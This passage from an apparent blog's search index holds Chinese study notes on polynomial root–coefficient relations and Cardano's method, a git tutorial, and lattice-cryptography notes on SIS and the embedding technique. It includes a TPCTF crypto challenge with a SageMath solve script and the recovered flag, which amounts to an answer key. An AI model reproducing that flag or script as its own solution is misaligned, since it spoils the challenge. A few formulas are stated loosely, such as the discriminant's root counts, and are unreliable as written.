$e_1=e_2=e_3=0,e_4=1,e_5=-1$ $p_1=p_2=p_3=0,p_4=-4,p_5=-5$ $p_5+20p_4+0+0+0+4^5\\cdot5=\\boxed{5035}.\\square$ 科目二 对于多项式$f(x) = \\sum_{i=0}^{n} a_{i}x^{n-i}$,已知条件如下,请将$a_{i}$写成以$a,b,c$标出的形式。 $$ \\begin{aligned} a =x_{1}+x_{2}+x_{3} \\\\\\\\ b = x_{1}^{2}+x_{2}^{2}+x_{3}^{2} \u0026= (x_{1}+x_{2}+x_{3})^{2}- 2(x_{1}x_{2} + x_{2}x_{3} + x_{3}x_{1} ) \\\\\\\\ c = x_{1}^{3} + x_{2}^{3} +x_{3}^{3} \u0026= (x_{1} +x_{2} + x_{3})^{3} - 3(x_{1}x_{2} +x_{2}x_{3} +x_{3}x_{1})(x_{1} +x_{2} +x_{3} ) + 3x_{1}x_{2}x_{3} \\\\\\\\ \\end{aligned}$$ $$ \\begin{aligned} \u0026\\sigma_{1} =x_1+x_2+x_3=a \\\\\\\\ \u0026σ_2 =x_1x_2+x_2x_3+x_3x_1=\\frac{a^2-b}2 \\\\\\\\ \u0026σ_3 =x_1x_2x_3=\\frac{\\left(c+3a\\frac{a^2-b}2-a^3\\right)}3 \\end{aligned} $$ 根据上面得学习： $$ σ_{k}= (-1)^{k}a_{k},1\\le k \\le n $$ 即 $$ \\begin{aligned} \u0026\\sigma_{1} =x_1+x_2+x_3=a \\\\\\\\ \u0026σ_2 =x_1x_2+x_2x_3+x_3x_1=\\frac{a^2-b}2 \\\\\\\\ \u0026σ_3 =x_1x_2x_3=\\frac{\\left(c+3a\\frac{a^2-b}2-a^3\\right)}3 \\end{aligned} $$ 假设所求多项式$f(x)$的对应首一多项式为$f’(x)$，那么可得其对称多项式表出$g’(x)$ $$g'(x)= x^{3} - ax^{2} + \\left( \\frac{a^{2}-b}{2} \\right)x - \\frac{\\left( c+ 3a \\frac{a^{2}-b}{2}-a^3 \\right)}{3}$$ 注意到定义多项式系数$a_{i}$定义在$\\mathbb{Z}^+$上，故还原其中一个多项式为： $$f(x)=-6x_{1}^2+6ax_{1}^2+(-3a^2+3b)x_{1}+a^3-3ab+2c$$一元三次方程求根公式 ","date":"2024-04-04","objectID":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/:3:2","tags":[],"title":"根与多项式系数关系","uri":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/"},{"categories":[],"content":"历史的进程 Scipione del Ferro 首先得出不含二次项的一元三次方程求根公式. Niccolò Fontana “Tartaglia” 独立得出一元三次方程求根公式. Girolamo Cardano 拜访了Tartaglia，并获得了包含一元三次方程求根公式的暗语般的藏头诗. Lodovico Ferrari Cardano的学生在一元三次方程的求根公式的基础之上，给出了一元四次方程的求根公式 Galois 证明了，如果一个五次方程的置换群是一个不可分离的群，那么这个方程就没有求根公式 ","date":"2024-04-04","objectID":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/:4:0","tags":[],"title":"根与多项式系数关系","uri":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/"},{"categories":[],"content":"Cardano法 对于 一般的一元三次方程 $$ f(x) = ax^{3}+bx^{2} +cx +d=0,a,b,c,d\\in C,a \\ne 0\\tag{1} $$ 由代数基本定理，在复数域上有三个根。 简化为一元三次首一多项式： $$f'(x) = x^{3}+ b'x^{2}+ c'x +d' \\tag{2}$$配方法代换： 令$z= x+ \\frac{b’}{3}$（消去二次项为目的） $$z^{3} + pz + q = 0 \\tag{3}$$ 令$z= u+v$ $$ (u+v)^{3}+p(u+v)+q=0 $$ 整理得： $$ u^{3}+ v^{3} +3uv(u+v)+p(u+v)+q=0 $$ 即： $$(u+v)(3uv+p)=-q-(u^3+v^3)\\tag{4}$$考虑一种特殊的情况 $$\\begin{cases}3uv +p \u0026= 0 \\\\\\\\ u^{3}+v^{3}+q \u0026= 0 \\end{cases}\\tag{5}$$显然方程组$(5)$一定有解，且$(5)$的解一定是不定方程$(4)$的一个解。退而求其次，先找到原方程的一个解先。 $$(u^{3} - v^{3})= (u^3+v^3)^2-4u^3v^3$$ 代入得 $$(u^3-v^3)^2=q^2+\\frac{4}{27}p^3$$ 不妨取： $$\\begin{aligned} u^{3}\u0026= - \\frac{q}{2} \\pm \\sqrt{ \\frac{q^2}{4}+\\frac{p^3}{27} }\\\\\\\\ v^{3}\u0026= - \\frac{q}{2} \\mp \\sqrt{ \\frac{q^2}{4}+\\frac{p^3}{27} } \\end{aligned} $$特殊化 $$\\begin{cases} u^3 \u0026= - \\frac{q}{2}+\\sqrt{\\frac{q^2}{4}+\\frac{p^3}{27}} \\\\\\\\ v^3 \u0026= - \\frac{q}{2}- \\sqrt{\\frac{q^2}{4}+\\frac{p^3}{27}}\\end{cases}$$ 不难开三次方，在得到$z=u+v$就是一元三次方程的一个根。 判别式$\\Delta= \\frac{q^2}{4}+\\frac{p^3}{27}$即为判别式。 考虑特殊情况： $x^{3}=1$的三个根。 欧拉公式 $$e^{i\\theta} = \\cos \\theta + i \\sin \\theta$$ 注意到，$\\omega^{3} =1,\\omega = e^{\\frac{2\\pi i}{3}}=\\frac{-1+\\sqrt{ 3 }i}{2}$ 不难得到 $$\\begin{cases}\\omega\u0026=e^{\\frac{2\\pi i}3}=\\frac{-1+\\sqrt{3}i}2\\\\\\\\ \\omega^2\u0026=e^{\\frac{4\\pi i}3}=\\frac{-1-\\sqrt{3}i}2\\\\\\\\ \\omega^3\u0026=e^{2\\pi i}=1\u0026\\end{cases}$$ 恰好构成一个三阶循环群，可以在复平面内表示这三个根。 回到方程$z^{3}+pz +q = 0$： $u=u_{0},v= v_{0}$是方程组$(5)$的一个解, 那么,由工具$\\omega$可得方程组$(5)$的三组不同解： $$\\begin{cases}z\u0026=\\omega^0u_0+\\omega^0v_0\\\\\\\\z\u0026=\\omega^1u_1+\\omega^1v_1\\\\\\\\z\u0026=\\omega^2u_2+\\omega^2v_2\\end{cases}$$ 至此，我们的求解已经完成. 代回的形式可表示为： 判别式$\\Delta= \\frac{q^2}{4}+\\frac{p^3}{27}$即为判别式 $\\Delta \u003e 0$，方程有1个解 $\\Delta = 0$，方程有2个解 $\\Delta \u003c 0$，方程有3个解 判别式的一般定义： 对于多项式$P(x)=a_{n}x_{n}+a_{n-1}x_{n-1}+\\dots+a_{1}x+a_{0}$，在复数域上存在$n$个根 $x_{1},x_{2},\\dots,x_{n}$其判别式为 $$\\Delta=a_{n}^{2n-2}\\Pi_{1 \\le i \\le j \\le n}(x_{i}-x_{j})^2$$ 显然$\\Delta$为一个对称多项式. 例： 二次情况。 $$\\Delta=(x_{1}-x_{2})^2=(x_{1}+x_{2})^2-4x_{1}x_{2}=b^2-4ac$$ 这更直接的告诉我们：根之间的关系，是否相等，这才是判别式的本质，解一元多次方程的关键，这触及了群论的本质——对称。 Crypto实践 from secret import flag assert flag[:6] == 'TPCTF{' and flag[-1] == '}' flag = flag[6:-1] assert len(set(flag)) == len(flag) xs = [] for i, c in enumerate(flag): xs += [ord(c)] * (i + 1) p = 257 print('output =', [sum(pow(x, k, p) for x in xs) % p for k in range(1, len(xs) + 1)]) from Crypto.Util.number import * output = [125, 31, 116, 106, 193, 7, 38, 194, 186, 33, 180, 189, 53, 126, 134, 237, 123, 65, 179, 196, 99, 74, 101, 153, 84, 74, 233, 5, 105, 32, 75, 168, 161, 2, 147, 18, 68, 68, 162, 21, 94, 194, 249, 179, 24, 60, 71, 12, 40, 198, 79, 92, 44, 72, 189, 236, 244, 151, 56, 93, 195, 121, 211, 26, 73, 240, 76, 70, 133, 186, 165, 48, 31, 39, 3, 219, 96, 14, 166, 139, 24, 206, 93, 250, 79, 246, 256, 199, 198, 131, 34, 192, 173, 35, 0, 171, 160, 151, 118, 24, 10, 100, 93, 19, 101, 15, 190, 74, 10, 117, 4, 41, 135, 45, 107, 155, 152, 95, 222, 214, 174, 139, 117, 211, 224, 120, 219, 250, 1, 110, 225, 196, 105, 96, 52, 231, 59, 70, 95, 56, 58, 248, 171, 16, 251, 165, 54, 4, 211, 60, 210, 158, 45, 96, 105, 116, 30, 239, 96, 37, 175, 254, 157, 26, 151, 141, 43, 110, 227, 199, 223, 135, 162, 112, 4, 45, 66, 228, 162, 238, 165, 158, 27, 18, 76, 36, 237, 107, 84, 57, 233, 96, 72, 6, 114, 44, 119, 174, 59, 82, 202, 26, 216, 35, 55, 159, 113, 98, 4, 74, 2, 128, 34, 180, 191, 8, 101, 169, 157, 120, 254, 158, 97, 227, 79, 151, 167, 64, 195, 42, 250, 207, 213, 238, 199, 111, 149, 18, 194, 240, 53, 130, 3, 188, 41, 100, 255, 158, 21, 189, 19, 214, 127] p = 257 P = output e = [] for i in range(253): temp = 0 for j in range(i): temp += (-1)**j * e[j] * P[i-j-1] temp %= p temp = (P[i] - temp) % p ei = temp * inverse((-1)^i*(i+1), p) % p e.append(ei) a = [1] for i in range(len(e)): a.append((-1)^(i+1) * e[i] % p) PR.\u003cx\u003e = PolynomialRing(Zmod(p)) f = 0 for i in range(253): f += x^(253-i)*a[i] f += a[-1] res = f.roots() #get flag flag = [0 for i in range(22)] for i in res: flag[i[1]-1] = chr(i[0]) print(\"TPCTF{\" + \"\".join(flag) + \"}\") #TPCTF{polyisfun_MJCQz:a^VX\"G} ","date":"2024-04-04","objectID":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/:5:0","tags":[],"title":"根与多项式系数关系","uri":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/"},{"categories":[],"content":"That is git! 1.概述 git 是目前较为先进的分布式版本控制系统。 ","date":"2024-04-04","objectID":"/noteforgit/:0:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"原理和流程： 此处的Repository 一般指代本地仓库，Remote则为远程仓库。 ","date":"2024-04-04","objectID":"/noteforgit/:1:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"SVN \u0026 Git ： SVN是集中式版本控制系统，版本库统一存放在中央服务器，工作时需要从中央服务器获取最新版本，工作后将工作成果返回中央服务器。基于此，SVN需要联网工作，互联网条件下易受带宽限制。 Git是分布式版本控制系统，无中央服务器，工作时可不必联网，但多人协作需要互相推送各自修改。 ","date":"2024-04-04","objectID":"/noteforgit/:2:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"功能: 一个良好的多端同步工具，可记录与返回历史版本，为多人协作实现便利。 ","date":"2024-04-04","objectID":"/noteforgit/:3:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"缘起： Linux的发展过程中，开源文化与开源开发者扮演了重要角色，而版本控制的需求日益增长，手工合并的实现日渐不能满足需求，linus认为CVS和SVN既有带宽的弊端，也违背开源文化，于是乎Lin us花了两周时间自己用C写了一个分布式版本控制系统 ","date":"2024-04-04","objectID":"/noteforgit/:4:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"Git on Windows Windows 下在官网下载并安装后，可进行配置： $ git config --global user.name \"Your Name\" $ git config --global user.email \"email@example.com\" –global参数表示全局，即本机使用git时已经选定了特定仓库，当然也可以为特定的本地仓库指定远程仓库。 2.Repository 可以简单理解为一个目录，目录内所有文件均可被git管理。其中每个文件的修改、删除，均可被git追踪，一辩任何时刻均可追溯历史，或者在将来某个时刻进行还原。 ","date":"2024-04-04","objectID":"/noteforgit/:5:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"2.1创建Repository： Step_0: $mkdir learngit $cd learngit $pwd /halois/learngit win下保证目录树中无中文，以避免奇怪的问题发生 Step_1: $git init Step_2 $git add \u003cfilename\u003e or \u003cdirectories\u003e Step_3 $git commit -m \"Explanatory statement\" Warning：不可含有任何中文 ","date":"2024-04-04","objectID":"/noteforgit/:6:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"2.2快照功能 git log 查看最近到最远的提交日志，即 “Explanatory statement” git status (base) PS E:\\desktop\\blogdemo\u003e git status On branch master nothing to commit, working tree clean git reset 回到上一个提交： git reset --hard HEAD^ 如果没有上一个提交将会: PS E:\\desktop\\blogdemo\u003e git reset --hard HEAD^ fatal: ambiguous argument 'HEAD^': unknown revision or path not in the working tree. Use '--' to separate paths from revisions, like this: 'git \u003ccommand\u003e [\u003crevision\u003e...] -- [\u003cfile\u003e...]' 请注意，git reset --hard命令是一个危险的操作，它会丢弃所有未提交的更改，并将分支移动到指定的提交。请确保在执行此命令之前备份重要的更改 HEAD指向当前版本。 其后可接指令或commit的版本号前几位即可，回退到指定版本，即便又所删除，只要shell尚未关闭，一切仍然可以挽回。 git reflog 查看历史版本号。 ","date":"2024-04-04","objectID":"/noteforgit/:7:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"2.3工作区和暂存区 Git区别于其他控制系统，如SVN含有暂存区。 工作区(Working Directory)：可见的目录（文件夹） 版本库(Repository): 工作区内含有一个名为.git的隐藏文件夹,这里在工作区的目录之中却在工作区之外，称为版本库。 内含：stage, master(分支)、指向master的一个指针叫做HEAD等 git add:把文件添加进入暂存区 git commit:把暂存区文件提交到当前分支 ","date":"2024-04-04","objectID":"/noteforgit/:8:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"2.4其他修改 git checkout – 工作区丢弃最近一次修改，返回最近的commit后状态。 git reset HEAD 可以把暂存区的修改撤销掉，重新放回工作区 情况1：文件只在工作区操作，未add。撤销操作：git restore 。结果：工作区文件回退。 情况2：文件已add，未commit。撤销操作：git restore –staged 。结果：暂存区文件回退，工作区文件未回退，如需继续回退，操按情况1操作。 情况3：文件已add，已commit。撤销操作：git reset –hard commit_id。结果：工作区文件、暂存区文件、本地仓库都回退 ","date":"2024-04-04","objectID":"/noteforgit/:9:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"2.5删除文件 rm 工作区内删除 git rm 版本库中删除 git checkout – 版本库中覆盖工作区中指定文件 3.远程仓库(remote) 以github 为例。 ","date":"2024-04-04","objectID":"/noteforgit/:10:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"3.1创建远程库 Remote端： 创建新仓库 本地: 在本地仓库目录下：git remote add origin git@github.com:\u003crepositoryname\u003e 此处的origin是git识别的远程仓库名字，可以修改，但是默认remote即命名为 origin 下一步就可以：本地上传远程 git push -u origin master git push是将本地内容推送到远程，上述命令把当前的分支master推送到远程。 -u参数 由于是第一次推送，使用-u推送后可以使得笨的的master和远程仓库的master关联起来，在以后的推送和拉去可以简化命令 git push origin master ","date":"2024-04-04","objectID":"/noteforgit/:11:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"3.2删除远程库 查看远程库信息： git remote -v 删除远程库： git remote rm \u003cRemotename\u003e 删除的含义：解除本地与远程的链接。如需要彻底删除，则需要进入远程库的管理系统进行删除。 ","date":"2024-04-04","objectID":"/noteforgit/:12:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"3.3远程传本地 git clone \u003cssh/https to your repository\u003e 4.分支管理 git 分支实际上是更改指向更改快照的指针。 ","date":"2024-04-04","objectID":"/noteforgit/:13:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"4.1创建与合并分支 HEAD、Branch、Commit $**p,*p,p$ 创建分支： git branch (branchname) 切换分支： git checkout (branchname) 切换分支时git会用该分支的最近一次快照内容替换工作目录内容，多个分支不需要多个目录 合并分支： git merge命令用于合并指定分支到当前分支 合并方式：（可暂时不做了解） Fast-Forward合并： 语法：git merge \u003cbranch-name\u003e 描述：当目标分支（通常是主分支）没有新的提交时，可以使用Fast-Forward合并。这种合并方式会直接将目标分支指向源分支的最新提交，形成一个线性的提交历史。因为没有新的合并提交，所以合并后的提交历史非常简洁。 普通合并（Regular Merge）： 语法：git merge \u003cbranch-name\u003e 描述：普通合并是最常用的合并方式之一。它会创建一个新的合并提交，将两个分支的更改合并到一起。在执行合并操作时，Git会自动创建一个新的提交，包含两个分支的更改内容。这种合并方式会保留每个分支的提交历史，并在合并提交中保留合并的信息。 变基（Rebase）： 语法：git rebase \u003cbranch-name\u003e 描述：变基是另一种合并分支的方式。它将当前分支上的提交按照顺序逐个应用到目标分支上，使得目标分支的提交历史变得更加线性。变基操作可以将当前分支上的提交“移动”到目标分支的最新位置，这样就可以在合并时保持一个干净的提交历史。变基操作会改写提交的SHA标识，因此在共享分支时需要特别注意。 Squash合并（Squash Merge）： 语法：git merge --squash \u003cbranch-name\u003e 描述：Squash合并是将多个提交压缩为一个提交的方式。它会将一个分支上的所有提交合并成一个新的提交，并将其应用到目标分支上。这种合并方式适用于需要保持干净、整洁的提交历史，将多个相关的提交合并为一个更有意义的提交。 分支的时间线理解： 不直接修改时间线，仅仅修改指针。 git checkout -b dev 穿件并切换到；相当于 git branch dev git checkout dev 然后使用git branch查看分支状态 切换到已有的分支： git switch main 创建新的并切换到分支： git switch -c dev 这一更新是为了使得 git checkout 不那么容易混淆在版本库和工作区之间的操作。 ","date":"2024-04-04","objectID":"/noteforgit/:14:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"4.2解决冲突 合并分支并非一帆风顺，代码相与亦非易如反掌。 无法快速合并冲突 准备分支feature1，git switch -c feature1 分别作不同修改并提交，此时feature1和master所指提交不同，无法快速合并 报错如： $ git merge feature1 Auto-merging readme.txt CONFLICT (content): Merge conflict in readme.txt Automatic merge failed; fix conflicts and then commit the result. git status也可获得冲突信息 $ git status On branch master Your branch is ahead of 'origin/master' by 2 commits. (use \"git push\" to publish your local commits) //对比远程和本地的提交次数 You have unmerged paths. (fix conflicts and run \"git commit\") (use \"git merge --abort\" to abort the merge) Unmerged paths: (use \"git add \u003cfile\u003e...\" to mark resolution) both modified: readme.txt no changes added to commit (use \"git add\" and/or \"git commit -a\") 解决： ","date":"2024-04-04","objectID":"/noteforgit/:15:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"4.3分支协作 git merge --no-ff -m \"Explanatory statement\" \u003ctarget branch\u003e --no-ff参数表示禁用Fast forward模式，于是git在merge时会新生成一个提交，从分支历史上可清晰看见分支信息 基于此可以实现多人协作： ","date":"2024-04-04","objectID":"/noteforgit/:16:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"4.4临时分支 当前工作区工作可以缓存 git stash 缓存后会自动清除工作区，可以通过 git stash list 查看缓存 还原 还原缓存至工作区，但是不删除缓存 git stash apply 还原缓存至工作区，同时删除缓存 git stash pop 删除缓存 git stash drop 但是这不是简单的栈结构，这里可以多次缓存以特定编号指定恢复和删除。 $ git stash list stash@{0}: WIP on dev: f52c633 add merge $ git stash apply stash@{0} 临时分支的修改需要作用与其他分支 $git cherry-pick \u003ccode of commit\u003e ","date":"2024-04-04","objectID":"/noteforgit/:17:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"4.5测试分支 新的功能需求出现：建立测试分支 $git switch -c feature-test $git add test.py $git commit -m \"add features test\" $git switch dev $git branch -d feature-test 如中途功能取消： 删除未合并分支 $git branch -D feature-test -D强行删除 ","date":"2024-04-04","objectID":"/noteforgit/:18:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":"4.6多人协作 查看远程仓库 $git remote origin 可以加入参数 -v以查看详细信息（origin的地址） 推送分支 把本地所有可推送内容推如指定分支。 $git push origin master 如果要推送其他分支如dev $git push origin dev 抓取分支 一般的，默认master(main)分支和dev分支均及推送，而这两个分支也大多会被及时抓取 新来的伙伴需要构建他的dev $git checkout -b dev origin/dev 建立了本地dev分支和远程的dev分支的关联。 值得注意的是需要先保持本地和远程一致，再提交自己的修改。 $git pull 在pull之前也首先需要建立一个链接 $git branch --set-upstream-to=origin/dev dev 多人协作一般方式： git push \u003cbranch name\u003e试图推送自己的修改 推送失败，git pull更新本地 pull有冲突解决冲突 再次push 5.标签管理 标签(tag)类似branch,但是不可移动，定向指向一个commit 创建标签 切换到需要打标签的分支上 git tag \u003cname\u003e git tag查看标签 对历史提交打标签 $git tag \u003ctagname\u003e \u003ccode of commit\u003e tag状态的排序按照字母顺序。 查看详细信息： $git show \u003ctagname\u003e 同样的可以加入一些说明性文字 $git tag -a v1.0 -m \"version 0.1 released\" 1024aa -a指定了标签名，-m加入说明性文字。均可以在git show中查看 标签是跨分支的，tag创建后在任何分支均可查看 6.忽略文件 部分文件需要放在工作目录中却不可以推送提交。 显示untracked不够优雅 创建.gitignore文件 忽略文件的原则： 忽略操作系统生成的文件 忽略编译中间产物 忽略敏感信息文件 失误操作的挽回： 检查.gitignore文件：git check-ignore 强制添加文件：git add -f \u003cfilename\u003e ","date":"2024-04-04","objectID":"/noteforgit/:19:0","tags":[],"title":"NoteForGit","uri":"/noteforgit/"},{"categories":[],"content":" Begin with Knapsack. Note from CS355 \u0026 Regev. ","date":"2023-06-18","objectID":"/lattice-part-3/:0:0","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Short Integer Solution (SIS) problem ","date":"2023-06-18","objectID":"/lattice-part-3/:1:0","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Definition The SIS problem is parameterized by the matrix dimensions $n,m \\in \\mathbb{N}$, modulus $q$, and a norm bound $B$ on the solution. One should think of $n$ as the parameter $\\lambda$ that defines the hardness of the problem. The bigger $n$ is, the harder the problem becomes. The parameter $m$ is set depending on the specific applications, but generally $m \\gg n$. The modulus $q$ can be set to be any $q = \\operatorname{poly}(n)$, but concretely, just think of $q = O(n^2)$. The norm bound $B \\ll q$ should also be set depending on the specific applications. Notice that a solution $z$ for $A$ can be converted to a solution for the extension $[A|A^{\\prime}]$ by appending $0$s to $z$: big $m\\Rightarrow$ easy (the more vectors we are given, the easier the problem becomes) big $n\\Rightarrow$ hard (the more dimension we work in the harder the problem becomes) It is conjectured that for any sufficiently large $n \\in \\mathbb{N}$ (this is the security parameter), for any $m,q,B \\in \\mathbb{N}$, satisfying $q \\gt B\\cdot\\operatorname{poly}(n)$ (for any polynomial poly) , the $\\text{SIS}(n,m,q,B)$ is hard. But we cannot say that Short Integer Solution (SIS𝑆𝐼𝑆) problem is NP-Complete. Application: CRHF, SLHL etc. SIS 问题可以最终规约到格中的 SIVP 问题上，进而在选定参数的情况下，在部分情况下是可以求解的。一般的，Inhomogeneous SIS （非齐次情况）在 CTF 中遇到的更多. ","date":"2023-06-18","objectID":"/lattice-part-3/:1:1","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Without Modulus Modification Let $n$ be an integer and $\\alpha=\\alpha(n),\\beta=\\beta(n),m=m(n)\u003e\\Omega(n\\log\\alpha)$ be functions of $n$.Sample a uniform $A\\leftarrow[-\\alpha,\\alpha]^{n\\times m}$.The task is to compute “short” vector $e\\in\\mathbb{Z}^m$ in the kernel of $A$. That is: $$ \\begin{cases} \\Vert e \\Vert \u0026\\lt \\beta \\\\\\\\ A \\cdot e \u0026= 0^n \\end{cases} $$ Here, equality holds over the integers. Trivial attack: There is an trivial algorithm in the case where $\\beta$ is huge. You can compute a kernel vector over the integers by taking minors of the matrix $A$.These minors, and hence the kernel vector, can be easily upper bounded by $(\\alpha n)^{O(n)}$. So in the regime $\\beta=(\\alpha n)^{O(n)}$, there is a trivial attack. It’s intersting to care about the distribution on matrix $A$. However it is still no doubt that if limiation of norm is set, then the problem is set to be hard. ","date":"2023-06-18","objectID":"/lattice-part-3/:1:2","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Inhomogeneous Short Integer Solution (ISIS) problem Inhomogeneous SIS is applied for OWF (one way function) and then Digital Signatures. We shall mentioned it in subsequent notes. ","date":"2023-06-18","objectID":"/lattice-part-3/:2:0","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Inhomogeneous linear equations 即对于这样的线性方程，可以考虑它的解空间，对于这样的解空间可以找到他的一组正交基，由于我们工作在整数上，即纯量域为 $\\mathbb{Z}$ ，所以所得基向量，可张成 Lattice . 自然地，考虑非齐次线性方程 $$ \\langle a,z\\rangle\\equiv c\\mathrm{~mod~}q\\tag{5.2} $$首先，注意到 $\\vec{0}$ 不是 Eq. 5.2 的一个解，那么 Eq. 5.2 的解便无法构成一个格空间。 特别的，$\\mathcal{x} \\in \\mathbb{Z}^{n}$ 是 Eq. 5.2 一个解，当且仅当 $\\mathcal{x} - \\mathcal{z}$ 是方程的一个解。那么代数上来看 Eq. 5.2 的所有解可以表示为齐次方程的解空间的一个陪集： $$ \\mathcal{L}+z $$这里，我们需要将找到 Eq. 5.2 一个 $l_2$ 范数意义上较短的解，同 CVP 联系起来。如过只是找到一组解，而没有任何范数意义上的限定，这样的求解是十分trivial的。 ","date":"2023-06-18","objectID":"/lattice-part-3/:3:0","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Solving linear equations for short integer solution. 当我们在用格规约一组方程所在线性空间的基向量时，我们在做什么？ ","date":"2023-06-18","objectID":"/lattice-part-3/:4:0","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Gaussian expected shortest length Definition. Let $\\mathcal{L}$ be a lattice of dimension $n$. The $\\textit{Gaussian expected shortest length}$ is $$ \\sigma (L)=\\sqrt{\\frac{n}{2\\pi e}}(\\det L)^{1/n} $$The Gaussian heuristic says that a shortest nonzero vector in a“ randomly chosen lattice\" will satisfy $$ \\Vert v_\\text{shortest}\\Vert \\approx\\sigma(\\mathcal{L}) $$More precisely, if $\\epsilon\\gt 0$ is fixed, then for all sufficiently large $n$, a randomly chosen lattice of dimension $n$ will satisfy $$ (1-\\epsilon)\\sigma(\\mathcal{L})\\leq\\Vert v_{\\mathrm{shortest}}\\Vert \\leq(1+\\epsilon)\\sigma(\\mathcal{L}) $$ 注意到，$\\Vert v_{\\mathrm{shortest}} \\Vert = \\lambda_1(\\mathcal{L})$ 容易联想到，此前 Minkowski’s Second Theorem 给出的行列式为单的上界 $$ \\left(\\prod_{i=1}^n\\lambda_i\\right)^{1/n}\\leq\\sqrt{n}(\\det\\Lambda)^{1/n} $$然而这仅仅给出 $\\lambda_i$ 的增长速度是受到行列式限制的，或者说，$\\lambda_i$ 的排布相对紧 (tight). 但这里 Gaussian 从概率的角度给出了 $\\lambda_i$ 的期望值，并引入 $\\epsilon$ 给出了一个关于 $\\lambda_i$ 的一个更紧的界。 ","date":"2023-06-18","objectID":"/lattice-part-3/:4:1","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Recall LLL property LINK Let $B = \\set{b_1,…,b_n}$ be a $\\delta$-$LLL$-reduced basis. Then $$ \\Vert b_1 \\Vert \\le \\left(\\frac{2}{\\sqrt{4\\delta-1}}\\right)^{n-1}\\lambda_{1} \\le\\left(\\frac{2}{\\sqrt{4\\delta-1}}\\right)^{n-1}\\sqrt{n}\\cdot\\Vert\\det(\\mathcal{L})\\Vert^{1/n} $$ 利用这一中间界： ","date":"2023-06-18","objectID":"/lattice-part-3/:4:2","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Conclusion $$ \\begin{cases} \\Vert B\\Vert \\le \\sigma(\\mathcal{L}),\\mathcal{L}\\text{~is~}\\mathcal{L}(B) \\\\\\\\ v\\mathcal{L} = w\\end{cases} $$ 即我们令 $\\Vert B\\Vert = \\det \\mathcal{L} \\le \\sigma(\\mathcal{L})$, 此时只需判定这个不等式是否成立来判定 LLL 的解的情况。 至此我们只需要把目标问题化归到 $\\gamma$-SVP 即可。 那么一般思路就是，构造合适的 lattice , 将我们的目标短向量嵌入其中，调整行列式大小 (re-scale the lattice) 来进行规约以求解。这里有时用到了 Embedding Technique . ","date":"2023-06-18","objectID":"/lattice-part-3/:4:3","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Embedding Technique 前文有提到，非齐次状态下的小范数求解，可证明为 CVP 问题，也可化归到工作在陪集 $\\mathcal{L} - t$ 上的 SVP 问题，现介绍一种手法来近似求解这一问题。 令基向量矩阵为$B$，给定目标向量 $t = c$，那么一般的构造如下矩阵： $$ B^{\\prime} = \\begin{bmatrix} c \u0026 B \\\\\\\\ 1 \u0026 0 \\end{bmatrix} $$注意到 $$ \\det B^{\\prime} = \\det B $$那么 $$ \\operatorname{vol}B^{\\prime} = \\operatorname{vol} B $$令目标向量 所得 CVP 的解为 $x = \\sum \\lambda_i b_i$ . 那么此时在 $B^{\\prime}$ 中存在短向量 $(c-x,1)$ (Embedding) . 此时完成了一个近似CVP的解。 那么一定条件下，只需将待求非齐次方程 $ u = \\sum a_i x_i$转化为 目标向量 求解即可。值得注意的是，有时需要先调整行列式大小，再规约，然后再做相反的调整。 更详细的证明，会在接下来的Knapsack 中给出解释。 ","date":"2023-06-18","objectID":"/lattice-part-3/:4:4","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Knapsack 